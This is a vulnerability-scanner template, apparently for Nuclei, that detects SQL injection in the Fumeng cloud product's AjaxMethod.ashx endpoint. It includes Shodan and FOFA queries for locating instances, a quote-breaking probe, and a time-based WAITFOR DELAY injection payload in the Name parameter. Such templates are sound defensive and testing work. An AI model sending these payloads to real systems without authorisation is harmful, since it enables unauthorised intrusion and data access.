id: fumengyun-sqli

info:
  name: Fumeng - SQL 注入漏洞
  author: ritikchaddha
  severity: critical
  description: |
    该模板用于检测 Fumeng - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会向 `/` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://github.com/emadshanab/goby-poc/blob/main/fumengyun%20%20AjaxMethod.ashx%20SQL%20injection.json
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-score: 0.00076
    epss-percentile: 0.31944
  metadata:
    max-request: 1
    shodan-query: title:"孚盟云 "
    fofa-query: title="孚盟云 "
  tags: time-based-sqli,fumasoft,sqli,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(response, "孚盟")'
        internal: true

  - raw:
      - |
        @timeout: 30s
        GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27 HTTP/1.1
        Host: {{Hostname}}

      - |
        @timeout: 30s
        GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: dsl
        name: error-based
        dsl:
          - 'contains_all(response_1, "SELECT count", "System.Exception:", "WHERE upper")'
          - 'status_code_1 == 500'
        condition: and

      - type: dsl
        name: time-based
        dsl:
          - 'duration_2>=6'
          - 'len(body_2) == 1'
          - 'regex("^0$", body_2)'
          - 'contains(content_type_2, "text/plain")'
        condition: and
